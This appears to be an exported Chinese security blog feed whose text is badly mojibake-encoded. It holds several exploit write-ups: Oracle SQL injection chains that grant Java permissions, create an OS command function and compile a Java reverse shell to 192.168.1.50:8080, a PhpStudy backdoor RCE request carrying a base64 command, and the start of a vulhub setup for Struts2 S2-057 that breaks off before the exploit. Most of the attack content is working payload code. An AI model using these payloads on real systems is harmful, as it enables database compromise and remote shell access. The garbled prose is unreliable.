<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">--å½“å‰ç”¨æˆ·æŸ¥çœ‹</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''YY'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''&lt;&lt;ALL FILES&gt;&gt;'''''''', ''''''''execute'''''''');end;'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></tbody></table></figure>
<p>æŸ¥çœ‹å¯ç”¨çš„javaæƒé™åˆ—è¡¨ï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹èµ‹æƒæƒ…å†µ</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_java_policy <span class="keyword">where</span> grantee_name<span class="operator">=</span><span class="string">'YY'</span>;</span><br></pre></td></tr></tbody></table></figure>
<p><img src="newcontext_java_policy_01.png" alt="newcontext_java_policy_01"></p>
<p>è‹¥èµ‹æƒå¤±è´¥ï¼Œæœ€åæ‰§è¡Œå‘½ä»¤æ—¶ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯<br>
<img src="newcontext_linxruncmd_error_01.png" alt="newcontext_linxruncmd_error_01"></p>
<p>æ­¤å¤„å¾ˆå‘ï¼Œå‰åæŠ˜è…¾ï¼Œä¸çŸ¥é“å“ªé‡Œé—®é¢˜ï¼Œæœ‰æ—¶å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œæœ‰æ—¶ä¸èƒ½ï¼Œç½‘ä¸Šæ‰¾äº†å¤ªå¤šèµ‹æƒå‘½ä»¤ï¼Œä¸çŸ¥æ˜¯å“ªä¸€æ¡æˆåŠŸï¼Œå¯¼è‡´æˆ‘æ¢å¤å¿«ç…§ä¸ä¸‹10æ¬¡æµ‹è¯•é—®é¢˜åˆ°åº•å‡ºåœ¨å“ªã€‚</p>
<p>æœ€åæ‰¾åˆ°ä¸Šè¿°æŸ¥çœ‹èµ‹æƒæƒ…å†µå‘½ä»¤ï¼Œæ‰æ‰¾å‡ºå“ªæ¡èµ‹æƒå‘½ä»¤èƒ½æˆåŠŸã€‚æ‰€ä»¥ï¼Œå‘åœ¨å“ªé‡Œï¼Ÿ</p>
<h5 id="T00ls"><a class="header-anchor" href="#T00ls">Â¶</a><a href="https://www.t00ls.net/thread-35507-1-1.html">T00ls</a></h5>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''begin dbms_java.grant_permission( ''''SYSTEM'''', ''''SYS:java.io.FilePermission'''', ''''&lt;&lt;ALL FILES&gt;&gt;'''',''''EXECUTE'''');end;''commit;end;'</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></tbody></table></figure>
<p><img src="newcontext_java_policy_01_t00ls.png" alt="newcontext_java_policy_01_t00ls"><br>
æ˜¾è€Œæ˜“è§ï¼Œæ ¹æœ¬æ²¡èµ‹æƒæˆåŠŸ<br>
å…³äºä¸Šè¿°èµ‹æƒå¤±è´¥ï¼Œè¯„è®ºé‡Œä½œè€…å›å¤ä½¿ç”¨ä¸‹è¿°å‘½ä»¤</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''grant javauserpriv to YY''commit;end;'</span>) <span class="keyword">from</span> dual;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''grant javasyspriv to YY''commit;end;'</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></tbody></table></figure>
<p><img src="newcontext_java_policy_01_t00ls.png" alt="newcontext_java_policy_01_t00ls"></p>
<p>æ˜¾ç„¶ï¼Œä¸€æ ·çš„ç»“æœ</p>
<h5 id="éšé£â€™s-blog"><a class="header-anchor" href="#éšé£â€™s-blog">Â¶</a><a href="https://www.iswin.org/2015/06/13/hack-oracle/">éšé£â€™s blog</a></h5>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''&lt;&lt;ALL FILES&gt;&gt;'''''''',''''''''execute'''''''');end;'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></tbody></table></figure>
<p><img src="newcontext_java_policy_02_suifeng.png" alt="newcontext_java_policy_02_suifeng"></p>
<p>å¯è§ï¼Œä¸¤ç§æ–¹å¼å‡æ— æœ</p>
<h4 id="3-åˆ›å»ºå‡½æ•°-v2"><a class="header-anchor" href="#3-åˆ›å»ºå‡½æ•°-v2">Â¶</a>(3) åˆ›å»ºå‡½æ•°</h4>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;'</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></tbody></table></figure>
<p>åˆ¤æ–­æ˜¯å¦åˆ›å»ºæˆåŠŸ</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> OBJECT_ID <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="operator">=</span><span class="string">'LINXRUNCMD'</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="newcontext_object_id_01.png" alt="newcontext_object_id_01"></p>
<p>ä¹Ÿå¯é€šè¿‡æŸ¥çœ‹all_objectså†…éƒ¨æ”¹å˜åˆ¤æ–­</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="keyword">like</span> <span class="string">'%LINX%'</span> <span class="keyword">or</span> object_name <span class="keyword">like</span> <span class="string">'%Linx%'</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="newcontext_all_objects_02.png" alt="newcontext_all_objects_02"></p>
<p>è‹¥æƒ³åˆ é™¤åˆ›å»ºçš„å‡½æ•°ï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤åˆ é™¤</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> LinxRunCMD</span><br></pre></td></tr></tbody></table></figure>
<h4 id="4-æ‰§è¡Œ"><a class="header-anchor" href="#4-æ‰§è¡Œ">Â¶</a>(4) æ‰§è¡Œ</h4>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> LinxRunCMD(<span class="string">'id'</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></tbody></table></figure>
<p>æ­å–œï¼ï¼ï¼</p>
<p><img src="newcontext_linxruncmd_01.png" alt="newcontext_linxruncmd_01"></p>
<p><img src="newcontext_linxruncmd_02.png" alt="newcontext_linxruncmd_02"></p>
<h2 id="æ–¹æ³•3-DBMS-JAVA-TEST-FUNCALL"><a class="header-anchor" href="#æ–¹æ³•3-DBMS-JAVA-TEST-FUNCALL">Â¶</a>æ–¹æ³•3. DBMS_JAVA_TEST.FUNCALL()</h2>
<h3 id="ä½¿ç”¨java-privileges"><a class="header-anchor" href="#ä½¿ç”¨java-privileges">Â¶</a>ä½¿ç”¨java privileges</h3>
<blockquote>
<ul>
<li>å½±å“ç‰ˆæœ¬ï¼š 10g R2, 11g R1, 11g R2</li>
<li>æƒé™ï¼šJava Permissions.</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="string">'oracle/aurora/util/Wrapper'</span>,<span class="string">'main'</span>,<span class="string">'/bin/bash'</span>,<span class="string">'-c'</span>,<span class="string">'pwd &gt; /tmp/pwd.txt'</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></tbody></table></figure>
<p>æ‰§è¡Œæ—¶æŠ¥å¦‚ä¸‹é”™ï¼Œè²Œä¼¼æ²¡èµ‹æƒï¼Ÿå®é™…ä¸Šèµ‹æƒåè¿˜æ˜¯ä¸€æ ·çš„é”™è¯¯</p>
<p><img src="test.funcall_error.png" alt="test.funcall_error 2"></p>
<p>ä½†ä¸å½±å“å‘½ä»¤çš„æ‰§è¡Œ</p>
<p><img src="test.funcall_01.png" alt="test.funcall_01"></p>
<p>è¯¥æ–¹å¼æ— å›æ˜¾ï¼Œåœ¨æ³¨å…¥æ—¶ä¸å¤ªæ–¹ä¾¿åˆ©ç”¨ï¼Œä½†å¯é€šè¿‡æ­¤æ–¹å¼åå¼¹ : )</p>
<h1>0x03 åå¼¹shell</h1>
<p>ç½‘ä¸Šé“ºå¤©ç›–åœ°windowsçš„payloadï¼Œlinuxä¸‹æ ¹æœ¬æ— æ³•åå¼¹ï¼Œè‡ªå·±æ‰‹åŠ¨æµ‹è¯•javaä»£ç åå¼¹ï¼Œç„¶åæ”¾å…¥oracle Sql</p>
<p>javaåå¼¹ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shellRev</span></span><br><span class="line">{</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">        {</span><br><span class="line">                System.out.println(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">try</span>{run();}</span><br><span class="line">                <span class="keyword">catch</span>(Exception e){}</span><br><span class="line">        }</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span><br><span class="line">        {</span><br><span class="line">                String[] aaa={<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 9&lt;&gt; /dev/tcp/192.168.1.50/8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh"</span>};</span><br><span class="line">                Process p=Runtime.getRuntime().exec(aaa);</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#ç¼–è¯‘</span></span><br><span class="line">javac shellRev.java</span><br><span class="line"><span class="comment">#æ‰§è¡Œ</span></span><br><span class="line">java shellRev</span><br></pre></td></tr></tbody></table></figure>
<h2 id="1-åˆ›å»ºjavaä»£ç "><a class="header-anchor" href="#1-åˆ›å»ºjavaä»£ç ">Â¶</a>1. åˆ›å»ºjavaä»£ç </h2>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "shell" as import java.io.*;import java.net.*;public class shell {public static void run() throws Exception{String[] aaa={"/bin/bash","-c","exec 9&lt;&gt; /dev/tcp/127.0.0.1/8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh"};Process p=Runtime.getRuntime().exec(aaa);}}'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></tbody></table></figure>
<h2 id="2-èµ‹äºˆjavaæƒé™"><a class="header-anchor" href="#2-èµ‹äºˆjavaæƒé™">Â¶</a>2. èµ‹äºˆjavaæƒé™</h2>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.net.SocketPermission'''''''', ''''''''&lt;&gt;'''''''', ''''''''*'''''''' );end;'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></tbody></table></figure>
<h2 id="3-åˆ›å»ºå‡½æ•°-v3"><a class="header-anchor" href="#3-åˆ›å»ºå‡½æ•°-v3">Â¶</a>3. åˆ›å»ºå‡½æ•°</h2>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; '''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></tbody></table></figure>
<h2 id="4-èµ‹äºˆå‡½æ•°æ‰§è¡Œæƒé™-v2"><a class="header-anchor" href="#4-èµ‹äºˆå‡½æ•°æ‰§è¡Œæƒé™-v2">Â¶</a>4. èµ‹äºˆå‡½æ•°æ‰§è¡Œæƒé™</h2>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on reversetcp to public'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></tbody></table></figure>
<h2 id="5-åå¼¹shell"><a class="header-anchor" href="#5-åå¼¹shell">Â¶</a>5. åå¼¹shell</h2>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sys.reversetcp <span class="keyword">from</span> dual</span><br></pre></td></tr></tbody></table></figure>
<p><img src="reverse.png" alt="reverse"></p>
<h1>0x04 å‚è€ƒé“¾æ¥</h1>
<blockquote>
<p><a href="http://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf">Hacking Oracle from the Web</a><br>
<a href="http://www.usmacd.com/2017/10/11/oracle_run_os_cmd/">Execute os command in Oracle Database</a><br>
<a href="https://www.iswin.org/2015/06/13/hack-oracle/">Oracle Sqlæ³¨å…¥åˆ©ç”¨æ–¹æ³•</a><br>
<a href="https://www.t00ls.net/thread-35507-1-1.html">å¯¹ï¼¸ï¼¸ç«™æ‰‹å·¥oracleæ³¨å…¥åˆ°ç³»ç»Ÿshell</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>Phpstudy - RCE å¤ç°</title>
    <url>/2019/10/12/Phpstudy-RCE-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="check"><a class="header-anchor" href="#check">Â¶</a>check</h2>
<p>9æœˆ26å·å°±å†™å¥½äº†ï¼Œä¸€ä¸‹å­å°±åˆ°è¿™ä¸ªæ—¶å€™äº†ï¼Œä¸¥é‡æ‹–å»¶ç—‡</p>
<p>å…ˆç”¨å…¬å¼€çš„è„šæœ¬checkä¸€ä¸‹è‡ªå·±æœºå™¨ä¸Šå¸¸ç”¨çš„ï¼Œ<a href="https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw">phpstudyåé—¨æ–‡ä»¶åˆ†æä»¥åŠæ£€æµ‹è„šæœ¬</a></p>
<img src="/2019/10/12/Phpstudy-RCE-%E5%A4%8D%E7%8E%B0/check.jpg" class="">
<p>å‘µå‘µï¼Œä¸­æ‹›ï¼Œä¸€ç›´åœ¨ä½¿ç”¨<code>phpstudy2016</code>ç‰ˆï¼Œä¸Šå›¾æ˜¯2018æµ‹è¯•çš„ï¼ˆæˆ‘çš„2016ä¸€æ ·ä¸­æ‹›ï¼Œè¢«æˆ‘ä¿®å¤äº†ï¼Œæ²¡æˆªå›¾ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´åšè‚‰é¸¡ä¸‰å¹´äº†(å¾®ç¬‘)ï¼Œä¸è¿‡å¥½åœ¨æˆ‘åªåœ¨ç”¨çš„æ—¶å€™å¼€å¯<code>apache</code>ã€‚</p>
<div class="note info"><p>é˜…è¯»æœ¬ç¯‡æ–‡ç« èƒ½äº†è§£åˆ°ï¼š<span class="label success">phpstudy</span>, <span class="label success">RCE</span></p></div>
<span id="more"></span>
<p>é¦–å‘çš„æ–‡ç« è¯´ï¼Œå®˜ç½‘ä¸‹çš„å¹¶ä¸ä¼šå‡ºé—®é¢˜ï¼Œæˆ‘ä½¿ç”¨çš„ä¸€ç›´æ˜¯å®˜ç½‘çš„ï¼Œä¸Šå›¾ä¹Ÿæ˜¯2018ç‰ˆå®˜ç½‘ä¸‹çš„ï¼Œä¸€æ ·ä¸­æ‹›ï¼Œä¹Ÿå°±æ˜¯phpstudyæ—©åœ¨2016å¹´ç”šè‡³æ›´æ—©å°±è¢«é»‘äº†ã€‚</p>
<p><img src="phpstudy2018.jpg" alt="check"></p>
<h2 id="å¤ç°"><a class="header-anchor" href="#å¤ç°">Â¶</a>å¤ç°</h2>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.2.51</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7</span><br></pre></td></tr></tbody></table></figure>
<p><img src="rce.png" alt="rce"></p>
<p>å‘µå‘µï¼ŒçœŸå¥½ç”¨ï¼çœŸé¦™ï¼</p>
<p>åªéœ€è¦æ›´æ”¹<code>ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7</code>ï¼Œ<code>base64</code>ç¼–ç çš„å‘½ä»¤è€Œå·²</p>
<h2 id="å‘ç‚¹"><a class="header-anchor" href="#å‘ç‚¹">Â¶</a>å‘ç‚¹</h2>
<p><code>Accept-Encoding: gzip,deflate</code><br>
æ³¨æ„ï¼š<code>gzip,deflate</code> å¿…é¡»æ˜¯æ­¤æ ¼å¼ï¼Œä¸­é—´åªèƒ½æœ‰é€—å·ï¼Œä¸èƒ½æœ‰ç©ºæ ¼</p>
<p>æå¾—æˆ‘åˆæµ‹äº†å¥½ä¹…ï¼Œå› ä¸º<code>fiddler</code>æŠ“åŒ…æ˜¯è¿™æ ·çš„æ ¼å¼<code>gzip, deflate</code>ï¼Œè¿™æ ·ä¼šå¯¼è‡´<code>rce</code>å¤±è´¥</p>
<h2 id="å‚è€ƒé“¾æ¥"><a class="header-anchor" href="#å‚è€ƒé“¾æ¥">Â¶</a>å‚è€ƒé“¾æ¥</h2>
<p><a href="https://www.t00ls.net/viewthread.php?tid=52922">https://www.t00ls.net/viewthread.php?tid=52922</a><br>
<a href="https://www.t00ls.net/viewthread.php?tid=52966">https://www.t00ls.net/viewthread.php?tid=52966</a></p>
]]></content>
      <tags>
        <tag>å¤ç°</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2 - S2-057å¤ç° (CVE-2018-11776)</title>
    <url>/2018/08/29/Struts2-S2-057%E5%A4%8D%E7%8E%B0-CVE-2018-11776/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>Struts2åˆå‡ºæ¼æ´äº†ï¼Œä¸Šä¸€æ³¢çš„045å¥½ç”¨åˆ°ä¸è¡Œï¼Œå¤ç°å‚è€ƒ<a href="https://github.com/jas502n/St2-057">https://github.com/jas502n/St2-057</a></p>
<p>å†™è¿™ç¯‡æ–‡ç« æ—¶ï¼Œvulhubè¿˜æ²¡æœ‰057çš„æ¼æ´ç¯å¢ƒ</p>
<blockquote>
<p>å½“Struts2çš„é…ç½®æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ—¶ï¼š</p>
<ul>
<li>alwaysSelectFullNamespaceå€¼ä¸ºtrue</li>
<li>actionå…ƒç´ æœªè®¾ç½®namespaceå±æ€§ï¼Œæˆ–ä½¿ç”¨äº†é€šé…ç¬¦</li>
</ul>
<p>namespaceå°†ç”±ç”¨æˆ·ä»uriä¼ å…¥ï¼Œå¹¶ä½œä¸ºOGNLè¡¨è¾¾å¼è®¡ç®—ï¼Œæœ€ç»ˆé€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p>
</blockquote>
<p>å½±å“ç‰ˆæœ¬: å°äºç­‰äº Struts 2.3.34 ä¸ Struts 2.5.16</p>
<p>çœ‹è¿™ä¸ªæ¡ä»¶å°±çŸ¥é“æ²¡é‚£ä¹ˆå¥½åˆ©ç”¨</p>
<div class="note info"><p>é˜…è¯»æœ¬ç¯‡æ–‡ç« èƒ½äº†è§£åˆ°ï¼š<span class="label success">vulhub</span>, <span class="label success">docker</span></p></div>
<span id="more"></span>
<h2 id="0x01-vulhubå®‰è£…"><a class="header-anchor" href="#0x01-vulhubå®‰è£…">Â¶</a>0x01 vulhubå®‰è£…</h2>
<p>è¸©å‘ï¼š <a href="https://github.com/vulhub/vulhub/">https://github.com/vulhub/vulhub/</a></p>
<p><code>CentOS 7</code> å®‰è£…å„ç§ä¸æˆåŠŸï¼Œåˆ«å°çœ‹<code>Installation</code>ç®€ç®€å•å•4æ¡å‘½ä»¤ï¼ŒæŠ˜è…¾äº†ä¸€å¤©æ—¶é—´ï¼Œä»<code>CentOS</code> åˆ°<code>ubuntu16.04</code></p>
<p>æ€»ç»“ä¸€ä¸‹å‘ç‚¹ï¼ˆérootä¸‹å®‰è£…ï¼‰</p>
<h3 id="å®‰è£…pip"><a class="header-anchor" href="#å®‰è£…pip">Â¶</a>å®‰è£…pip</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">curl -s https://bootstrap.pypa.io/get-pip.py | python3</span><br></pre></td></tr></tbody></table></figure>
<p>ç›´æ¥ä½¿ç”¨å®‰è£…å‘½ä»¤ä¸€ç›´ æç¤º --useré”™è¯¯ï¼Œå°è¯•<code>sudo</code>ã€<code>python3 ååŠ --user</code>ã€è¿˜æ˜¯ä¸è¡Œï¼Œå„ç§å°è¯•ï¼Œä¸è¡Œ</p>
<p><img src="error-getPip.png" alt="error-getPip"></p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br><span class="line">python3 get-pip.py --user</span><br></pre></td></tr></tbody></table></figure>
<h3 id="å®‰è£…æœ€æ–°ç‰ˆdocker"><a class="header-anchor" href="#å®‰è£…æœ€æ–°ç‰ˆdocker">Â¶</a>å®‰è£…æœ€æ–°ç‰ˆdocker</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></tbody></table></figure>
<p>ç®€å•ä¸€æ¡å‘½ä»¤å®‰è£…ï¼Œæ€ä¹ˆéƒ½ä¸è¡Œï¼Œå°±æ˜¯å®‰è£…ä¸ä¸Šï¼Œè¿˜æ— æŠ¥é”™æç¤ºï¼Œ<code>-s</code> å®‰é™æ¨¡å¼å»æ‰ï¼Œçœ‹åˆ°è®¿é—®è¶…æ—¶ï¼Œä¼°è®¡åˆè¢«qäº†<br>
<img src="error-getDocker.png" alt="error-getDocker"></p>
<p>å®‰è£…proxychains+shadowsocks<br>
<a href="https://blog.csdn.net/szsteel1/article/details/54773544">Ubuntu 16.04 LTS shadowsocks+proxychains å®‰è£…åŠè®¾ç½®</a></p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">proxychains wget https://get.docker.com</span><br><span class="line"><span class="built_in">mv</span> index.html getdocker.sh</span><br><span class="line">sudo proxychains ./getdocker.sh</span><br><span class="line"></span><br><span class="line">toor@toor-virtual-machine:~$ docker -v</span><br><span class="line">Docker version 18.06.1-ce, build e68fc7a</span><br></pre></td></tr></tbody></table></figure>
<p>è¡Œäº†ï¼Œä¸¤æ¡å‘½ä»¤ç»ˆäºæå®šäº†ï¼Œä»¥ä¸ºä¸‡äº‹å¤§å‰ï¼Œå…¶å®è¸©å‘æ‰åˆšåˆšå¼€å§‹</p>
<h3 id="å¯åŠ¨dockeræœåŠ¡"><a class="header-anchor" href="#å¯åŠ¨dockeræœåŠ¡">Â¶</a>å¯åŠ¨dockeræœåŠ¡</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></tbody></table></figure>
<p><img src="error-compose.png" alt="error-compose"><br>
ä½ æ‡‚å¾—ï¼Œä¸ä¼šé‚£ä¹ˆé¡ºåˆ©ï¼Œç»§ç»­æŠ¥é”™ï¼Œç½‘ä¸Šå„ç§è§£å†³æ–¹æ³• <a href="http://blog.51cto.com/skytina/2044757">Couldnâ€™t connect to Docker daemon at http+unix://</a> éƒ½è¯•äº†ä¸€éè¿˜æ˜¯æ²¡æ³•å¯åŠ¨</p>
<p>æ€ä¹ˆåŠï¼Œæœ‰ç‚¹æŠ“ç‹‚äº†ï¼ŒæŠ˜è…¾ä¸€ä¸‹åˆäº†</p>
<p>ä»”ç»†çœ‹<code>README.md</code>ä¸­<code>Notice</code></p>
<blockquote>
<p>ä¸ºé˜²æ­¢å‡ºç°æƒé™é”™è¯¯ï¼Œæœ€å¥½ä½¿ç”¨rootç”¨æˆ·æ‰§è¡Œdockerå’Œdocker-composeå‘½ä»¤</p>
</blockquote>
<p>å°è¯•<code>sudo</code> å†æ¥ä¸€éï¼Œä¸€æ ·æ— æ³•å¯åŠ¨</p>
<p>é‡å¤´å¼€å§‹ï¼Œ</p>
<div class="note success"><p>`sudo su`è¿›å…¥`root`ï¼Œä»¥`root`æƒé™é‡æ–°æ¥è¿‡</p></div>
çº³å°¼ï¼Ÿå¯åŠ¨æ­£å¸¸äº†ï¼Œè¡Œå§ï¼ŒèŠ±ä¸€å¤©æ—¶é—´åªä¸ºè¸©å‘
<h3 id="å®‰è£…compose"><a class="header-anchor" href="#å®‰è£…compose">Â¶</a>å®‰è£…compose</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">pip install docker-compose</span><br></pre></td></tr></tbody></table></figure>
<h3 id="å®‰è£…git"><a class="header-anchor" href="#å®‰è£…git">Â¶</a>å®‰è£…git</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">apt install git</span><br></pre></td></tr></tbody></table></figure>
<h3 id="æ‹‰å–é¡¹ç›®"><a class="header-anchor" href="#æ‹‰å–é¡¹ç›®">Â¶</a>æ‹‰å–é¡¹ç›®</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></tbody></table></figure>
<h2 id="0x02-å¤ç°"><a class="header-anchor" href="#0x02-å¤ç°">Â¶</a>0x02 å¤ç°</h2>
